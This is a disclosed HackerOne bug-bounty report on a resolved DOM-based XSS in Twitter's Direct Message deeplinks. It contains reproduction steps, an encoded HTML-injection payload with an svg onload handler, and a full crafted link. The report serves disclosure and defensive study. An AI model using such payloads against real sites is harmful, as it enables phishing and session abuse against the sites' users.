---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '341908'
original_report_id: '341908'
title: XSS via Direct Message deeplinks
weakness: Cross-site Scripting (XSS) - DOM
team_handle: x
created_at: '2018-04-23T05:13:18.832Z'
disclosed_at: '2019-05-09T18:03:28.588Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 228
asset_identifier: '*.twitter.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# XSS via Direct Message deeplinks

## Metadata

- HackerOne Report ID: 341908
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: x
- Disclosed At: 2019-05-09T18:03:28.588Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Description:** 
By using a specially crafted payload as the value of the text parameter in a Direct Message deeplink, a malicious user can inject arbitrary HTML tags and possibly run arbitrary JavaScript code on the "twitter.com" origin.

## Steps To Reproduce:

  1. Create a Direct Message deeplink by following the instructions on this [Twitter developer guide](https://developer.twitter.com/en/docs/direct-messages/welcome-messages/guides/deeplinking-to-welcome-message).
  2. Use the following payload as the value for the text parameter:
```
%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2
```
  3. Tweet the deeplink you created. It should look like the following:
```
https://twitter.com/messages/compose?recipient_id=988260476659404801&welcome_message_id=988274596427304964&text=%3C%3C/%3Cx%3E/script/test000%3E%3C%3C/%3Cx%3Esvg%20onload%3Dalert%28%29%3E%3C/%3E%3Cscript%3E1%3C%5Cx%3E2
```

## Impact

It seems that the deployed CSP policy currently blocks the execution of arbitrary JavaScript code, however, arbitrary HTML tags can still be injection on `twitter.com` to carry out other kinds of attacks (i.e., deanonymization attacks, phishing, etc.). While you're in the process of verifying this, I'll be working on a bypass for the CSP policy in order to execute arbitrary JavaScript.

The hacker selected the **Cross-site Scripting (XSS) - DOM** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://twitter.com/fvofo0000001444/status/988278372894740480

**Verified**
Yes

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
